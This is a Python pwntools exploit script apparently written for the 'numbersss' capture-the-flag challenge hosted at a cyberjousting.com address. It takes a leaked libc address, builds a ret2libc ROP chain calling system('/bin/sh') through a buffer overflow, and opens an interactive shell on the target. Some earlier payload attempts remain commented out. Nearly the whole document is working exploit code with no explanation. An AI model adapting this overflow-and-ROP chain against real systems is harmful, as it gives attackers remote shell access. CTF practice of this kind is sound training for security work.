from pwn import *
from icecream import ic

exe = ELF("./numbersss")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("numbersss.chal.cyberjousting.com", 1351)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *0x401207
b *0x401261
b *0x0000000000401281
b *0x401258
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

ru("Free junk:")
libc.address = int(rl().strip().decode(), 16) - 0x55ef0
binsh = libc.address + 0x1b51d2
pop_rdi = libc.address + 0x00000000000240e5
ret = 0x0000000000401016
sa(b"How many bytes do you want to read in?\n", str(0x80).encode())
# rl()
# pause()
payload = b'a'*0x19
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(libc.symbols['system'])
payload = payload.ljust(0x80, b'a')
# ic(payload)
sl(payload)

# pause()
# io.sendlineafter(b"?\n", b"255")
# sleep(0.5)

# payload = b'a'*0x18
# payload += p64(0xdeadbeef)
# payload += p64(0xdeadbeef)
# payload += p64(0xdeadbeef)
# payload += p64(0xdeadbeef)
# payload = payload.ljust(255, b'a')

# io.sendline(payload)


# sl(b'250')
# sl(b'a'*250)

i()
